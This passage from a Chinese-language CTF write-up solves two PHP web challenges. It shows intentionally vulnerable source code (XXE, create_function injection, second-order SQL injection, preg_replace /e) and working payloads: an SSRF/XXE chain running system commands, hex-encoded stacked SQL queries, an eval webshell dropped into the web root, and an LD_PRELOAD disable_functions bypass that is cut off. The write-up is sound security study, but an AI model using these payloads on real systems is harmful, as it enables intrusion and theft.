}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>controllers/Fetch.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fetch</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleUrl</span><span class="hljs-params">($url)</span> </span>{</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        $invalidUrl = <span class="hljs-keyword">false</span>;</span><br><span class="line">true<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/aliyun\.com$/'</span>, $r[<span class="hljs-string">'host'</span>]) || preg_match(<span class="hljs-string">'/baidu\.com$/'</span>, $r[<span class="hljs-string">'host'</span>]) || preg_match(<span class="hljs-string">'/qq\.com$/'</span>, $r[<span class="hljs-string">'host'</span>])) { </span><br><span class="line">            $rss = Rss::fetch($url);</span><br><span class="line">        }<span class="hljs-keyword">else</span> {</span><br><span class="line">            $invalidUrl = <span class="hljs-keyword">true</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">require_once</span> <span class="hljs-string">'./views/Fetch.php'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>Rss.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Rss</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl_request</span><span class="hljs-params">($url, $post = <span class="hljs-string">''</span>, $cookie = <span class="hljs-string">''</span>, $headers = <span class="hljs-string">''</span>, $returnHeader = <span class="hljs-number">0</span>)</span> </span>{</span><br><span class="line">        $curl = curl_init();</span><br><span class="line">        curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($curl, CURLOPT_USERAGENT, <span class="hljs-string">'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_AUTOREFERER, <span class="hljs-number">1</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_REFERER, $url);</span><br><span class="line">        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, <span class="hljs-keyword">false</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> ($post) {</span><br><span class="line">            curl_setopt($curl, CURLOPT_POST, <span class="hljs-number">1</span>);</span><br><span class="line">            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> ($cookie) {</span><br><span class="line">            curl_setopt($curl, CURLOPT_COOKIE, $cookie);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> ($headers) {</span><br><span class="line">            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);</span><br><span class="line">        }</span><br><span class="line">        curl_setopt($curl, CURLOPT_HEADER, <span class="hljs-number">1</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_TIMEOUT, <span class="hljs-number">5</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);</span><br><span class="line">        $data = curl_exec($curl);</span><br><span class="line">        <span class="hljs-keyword">if</span> (curl_errno($curl)) {</span><br><span class="line">            <span class="hljs-keyword">return</span> curl_error($curl);</span><br><span class="line">        }</span><br><span class="line">        curl_close($curl);</span><br><span class="line">        <span class="hljs-keyword">list</span>($header, $body) = explode(<span class="hljs-string">"\r\n\r\n"</span>, $data, <span class="hljs-number">2</span>);</span><br><span class="line">        $info[<span class="hljs-string">'header'</span>] = $header;</span><br><span class="line">        $info[<span class="hljs-string">'body'</span>] = $body;</span><br><span class="line">        <span class="hljs-keyword">return</span> $info;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetch</span><span class="hljs-params">($url)</span> </span>{</span><br><span class="line">        libxml_disable_entity_loader(<span class="hljs-keyword">false</span>);</span><br><span class="line">        $rss=file_get_contents($url);</span><br><span class="line">        $rss=simplexml_load_string($rss,<span class="hljs-string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line">        <span class="hljs-keyword">return</span> $rss;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>view/Admin.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] != <span class="hljs-string">'127.0.0.1'</span>){</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">';('</span>);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">'package/header.php'</span>) <span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(!$rss) {</span><br><span class="line">    <span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;div class="rss-head row"&gt;</span><br><span class="line">    &lt;h1&gt;RSS解析失败&lt;/h1&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;此网站RSS资源可能存在错误无法解析&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;此网站RSS资源可能已经关闭&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;此网站可能禁止PHP获取此内容&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;可能由于来自本站的访问过多导致暂时访问限制Orz&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-keyword">exit</span>;</span><br><span class="line">};</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rss_sort_date</span><span class="hljs-params">($str)</span></span>{</span><br><span class="line">    $time=strtotime($str);</span><br><span class="line">    <span class="hljs-keyword">return</span> date(<span class="hljs-string">"Y年m月d日 H时i分"</span>,$time);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div class="rss-head row"&gt;</span><br><span class="line">    &lt;div class="col-sm-12 text-center"&gt;</span><br><span class="line">        &lt;h1&gt;&lt;a href=<span class="hljs-string">"&lt;?php echo $rss-&gt;channel-&gt;link;?&gt;"</span> target=<span class="hljs-string">"_blank"</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $rss-&gt;channel-&gt;title;<span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">        &lt;span style=<span class="hljs-string">"font-size: 16px;font-style: italic;width:100%;"</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $rss-&gt;channel-&gt;link;<span class="hljs-meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">        &lt;p&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $rss-&gt;channel-&gt;description;<span class="hljs-meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">        <span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($rss-&gt;channel-&gt;lastBuildDate)&amp;&amp;$rss-&gt;channel-&gt;lastBuildDate!=<span class="hljs-string">""</span>){</span><br><span class="line">                <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; 最后更新:"</span>.rss_sort_date($rss-&gt;channel-&gt;lastBuildDate).<span class="hljs-string">"&lt;/p&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">        <span class="hljs-meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class="article-list" style="padding:10px"&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> </span><br><span class="line">    $data = [];</span><br><span class="line">    <span class="hljs-keyword">foreach</span>($rss-&gt;channel-&gt;item <span class="hljs-keyword">as</span> $item){</span><br><span class="line">        $data[] = $item;</span><br><span class="line">    }</span><br><span class="line">    usort($data, create_function(<span class="hljs-string">'$a, $b'</span>, <span class="hljs-string">'return strcmp($a-&gt;'</span>.$order.<span class="hljs-string">',$b-&gt;'</span>.$order.<span class="hljs-string">');'</span>));</span><br><span class="line">    <span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $item){    </span><br><span class="line">    <span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;article class="article"&gt;</span><br><span class="line">            &lt;h1&gt;&lt;a href=<span class="hljs-string">"&lt;?php echo $item-&gt;link;?&gt;"</span> target=<span class="hljs-string">"_blank"</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $item-&gt;title;<span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">            &lt;div class="content"&gt;</span><br><span class="line">                &lt;p&gt;</span><br><span class="line">                    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $item-&gt;description;<span class="hljs-meta">?&gt;</span></span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class="article-info"&gt;</span><br><span class="line">                &lt;i style=<span class="hljs-string">"margin:0px 5px"</span>&gt;&lt;/i&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> rss_sort_date($item-&gt;pubDate);<span class="hljs-meta">?&gt;</span></span><br><span class="line">                &lt;i style=<span class="hljs-string">"margin:0px 5px"</span>&gt;&lt;/i&gt;</span><br><span class="line">                <span class="hljs-meta">&lt;?php</span></span><br><span class="line">                    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;count($item-&gt;category);$i++){</span><br><span class="line">                        <span class="hljs-keyword">echo</span> $item-&gt;category[$i];</span><br><span class="line">                        <span class="hljs-keyword">if</span>($i+<span class="hljs-number">1</span>!=count($item-&gt;category)){</span><br><span class="line">                            <span class="hljs-keyword">echo</span> <span class="hljs-string">","</span>;</span><br><span class="line">                        }</span><br><span class="line">                    };</span><br><span class="line">                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($item-&gt;author)&amp;&amp;$item-&gt;author!=<span class="hljs-string">""</span>){</span><br><span class="line">                <span class="hljs-meta">?&gt;</span></span><br><span class="line">                        &lt;i class="fa fa-user" style="margin:0px 5px"&gt;&lt;/i&gt;</span><br><span class="line">                <span class="hljs-meta">&lt;?php</span></span><br><span class="line">                        <span class="hljs-keyword">echo</span> $item-&gt;author;</span><br><span class="line">                    }</span><br><span class="line">                <span class="hljs-meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/article&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> }<span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class="text-center"&gt;</span><br><span class="line">    免责声明:本站只提供RSS解析,解析内容与本站无关,版权归来源网站所有</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">'package/footer.php'</span>) <span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以在 view/Admin.php 中看到关键点</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort($data, create_function(<span class="hljs-string">'$a, $b'</span>, <span class="hljs-string">'return strcmp($a-&gt;'</span>.$order.<span class="hljs-string">',$b-&gt;'</span>.$order.<span class="hljs-string">');'</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>这是个在 FireShell CTF 2019 出过的考点，因为<code>create_function</code>可以进行代码注入，我们可以有以下这种操作</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,id);};<span class="hljs-keyword">die</span>(system(<span class="hljs-string">'ls -la /'</span>));<span class="hljs-comment">/*</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这样就可以进行命令执行了，所以我们只需要在 xxe 中构造一个 ssrf 绕过 127.0.0.1 的判断就行了</p><p></p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="hljs-keyword">filter</span>/convert.base<span class="hljs-number">64</span>-encode/resource=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/rss_in_order?rss_url=http<span class="hljs-symbol">%3</span>A<span class="hljs-symbol">%2</span>F<span class="hljs-symbol">%2</span>F<span class="hljs-number">122.112</span>.<span class="hljs-number">199.14</span><span class="hljs-symbol">%2</span>Fexample&amp;order=id<span class="hljs-symbol">%2</span>Cid)<span class="hljs-symbol">%3</span>B<span class="hljs-symbol">%7</span>D<span class="hljs-symbol">%3</span>Bdie(system('ls<span class="hljs-symbol">%20</span>-la<span class="hljs-symbol">%20</span><span class="hljs-symbol">%2</span>F'))<span class="hljs-symbol">%3</span>B<span class="hljs-symbol">%2</span>F*</span><br></pre></td></tr></tbody></table></figure><p></p><p>在<code>/flag_eb8ba2eb07702e69963a7d6ab8669134</code>拿到 flag</p><h2 id="babyblog"><a href="#babyblog" class="headerlink" title="babyblog"></a>babyblog</h2><p>这个题最后没啥时间做了，比较可惜。赛后复盘了一下，仔细看看也没太大的难度，属于还算比较简单的。</p><p>扫描可以拿到 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a> ，拿到源码，进行审计。</p><p>在 replace.php 中有经过<code>$row['isvip'] == 1</code>判断才能使用的功能，在 register.php 中有</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql-&gt;query(<span class="hljs-string">"insert into users (username,password,isvip) values ('$username', '$password',0);"</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>每次注册<code>isvip</code>被设置为 0 的，所以接下来我们需要找个注入点把我们设置为 vip</p><p>关键点就在 edit.php 当中：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'title'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'content'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'id'</span>])){</span><br><span class="line">true<span class="hljs-keyword">foreach</span>($sql-&gt;query(<span class="hljs-string">"select * from article where id="</span> . intval($_POST[<span class="hljs-string">'id'</span>]) . <span class="hljs-string">";"</span>) <span class="hljs-keyword">as</span> $v){</span><br><span class="line">truetrue$row = $v;</span><br><span class="line">true}</span><br><span class="line">true<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">'id'</span>] == $row[<span class="hljs-string">'userid'</span>]){</span><br><span class="line">truetrue$title = addslashes($_POST[<span class="hljs-string">'title'</span>]);</span><br><span class="line">truetrue$content = addslashes($_POST[<span class="hljs-string">'content'</span>]);</span><br><span class="line">truetrue$sql-&gt;query(<span class="hljs-string">"update article set title='$title',content='$content' where title='"</span> . $row[<span class="hljs-string">'title'</span>] . <span class="hljs-string">"';"</span>);</span><br><span class="line">truetrue<span class="hljs-keyword">exit</span>(<span class="hljs-string">"&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">true}<span class="hljs-keyword">else</span>{</span><br><span class="line">truetrue<span class="hljs-keyword">exit</span>(<span class="hljs-string">"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">true}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>其中</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql-&gt;query(<span class="hljs-string">"update article set title='$title',content='$content' where title='"</span> . $row[<span class="hljs-string">'title'</span>] . <span class="hljs-string">"';"</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>$row['title']</code>是上面 sql 语句取出来的结果，而<code>title</code>在 writing.php 插入的时候，虽然做了防注入，使用<code>addslashes</code>转义了<code>title</code>的内容</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'title'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'content'</span>])){</span><br><span class="line">true$title = addslashes($_POST[<span class="hljs-string">'title'</span>]);</span><br><span class="line">true$content = addslashes($_POST[<span class="hljs-string">'content'</span>]);</span><br><span class="line">true$sql-&gt;query(<span class="hljs-string">"insert into article (userid,title,content) values ("</span> . $_SESSION[<span class="hljs-string">'id'</span>] . <span class="hljs-string">", '$title','$content');"</span>);</span><br><span class="line">true<span class="hljs-keyword">exit</span>(<span class="hljs-string">"&lt;script&gt;alert('Posted successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>但是在上面未经任何处理又直接取出来会导致二次注入，例如第一次插入<code>'1</code>，经过<code>addlashes</code>转义，sql 语句变成</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> article (userid,title,<span class="hljs-keyword">content</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">"1"</span>, <span class="hljs-string">'\'</span><span class="hljs-number">1</span><span class="hljs-string">','</span><span class="hljs-number">1</span><span class="hljs-string">');"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>但是插入数据库的内容是<code>'1</code>，取出来的时候也是<code>'1</code>，这就导致了注入。</p><p>所以我们可以利用这个点进行注入，update 我们的 isvip 字段就行</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="hljs-keyword">update</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">set</span> isvip=<span class="hljs-number">1</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">'zedd'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>接下来就是那个奇葩正则了：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="hljs-string">"benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|'|\").*?(`|'|\")|(\+|-|~|!|@:=|"</span> . urldecode(<span class="hljs-string">'%0B'</span>) . <span class="hljs-string">").+?)FROM(\\(.+\\)|\\s+?.+?|(`|'|\").*?(`|'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/'</span> . $filter . <span class="hljs-string">'/is'</span>, $value)){</span><br><span class="line">  <span class="hljs-keyword">exit</span>(<span class="hljs-string">"&lt;script&gt;alert('Failure!Do not use sensitive words.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>看起来虽然过滤了很多，但是我们依然可以使用堆叠注入来绕过：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">set</span> @t=<span class="hljs-number">0x73656c65637420312c323b</span>;<span class="hljs-keyword">prepare</span> x <span class="hljs-keyword">from</span> @t;<span class="hljs-keyword">execute</span> x;</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们把上面的 sql 语句换成16进制，就行了</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="hljs-keyword">set</span> @t=<span class="hljs-number">0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d277a656464273b</span>;<span class="hljs-keyword">prepare</span> x <span class="hljs-keyword">from</span> @t;<span class="hljs-keyword">execute</span> x;</span><br></pre></td></tr></tbody></table></figure><p></p><p>成为 vip 之后看到 replace.php 当中的内容：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = addslashes(preg_replace(<span class="hljs-string">"/"</span> . $_POST[<span class="hljs-string">'find'</span>] . <span class="hljs-string">"/"</span>, $_POST[<span class="hljs-string">'replace'</span>], $row[<span class="hljs-string">'content'</span>]));</span><br></pre></td></tr></tbody></table></figure><p></p><p>比较明显的一个利用 php 正则<code>/e</code>执行命令的写法，可以使用<code>%00</code>截断最后的一个斜杠，在<code>$_POST['find']</code>中使用<code>/e</code>修饰符</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find=/e%<span class="hljs-number">00</span>&amp;replace=phpinfo();&amp;regex=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>POST 之后拿到 phpinfo 信息，Web 根目录 <code>/var/www/html</code>， disable_functions :</p><p></p><figure class="highlight perl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,ini_set,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,<span class="hljs-keyword">system</span>,<span class="hljs-keyword">exec</span>,shell_exec,popen,proc_open,passthru,<span class="hljs-keyword">symlink</span>,<span class="hljs-keyword">link</span>,syslog,imap_open,dl,mail</span><br></pre></td></tr></tbody></table></figure><p></p><p>还有<code>putenv</code>，考烂了的 LD_PRELOAD 绕过，直接写个 webshell :</p><p></p><figure class="highlight reasonml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find=/e%<span class="hljs-number">00</span>&amp;replace=file<span class="hljs-constructor">_put_contents('<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">webshell</span>.<span class="hljs-params">php</span>','&lt;?<span class="hljs-params">php</span> <span class="hljs-params">eval</span>($<span class="hljs-params">_POST</span>[<span class="hljs-params">a</span>])</span>;');&amp;regex=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>发现还有 basedir 的限制，可以用以下列目录</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ($dh = opendir(<span class="hljs-string">"glob:///*"</span>)) {</span><br><span class="line">true<span class="hljs-keyword">while</span> (($file = readdir($dh)) !== <span class="hljs-keyword">false</span>) {</span><br><span class="line">truetrue<span class="hljs-keyword">echo</span> <span class="hljs-string">"$file\n"</span>;</span><br><span class="line">true}</span><br><span class="line">trueclosedir($dh);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>在根目录有<code>/readflag</code>，直接写一个 so 文件就行了</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 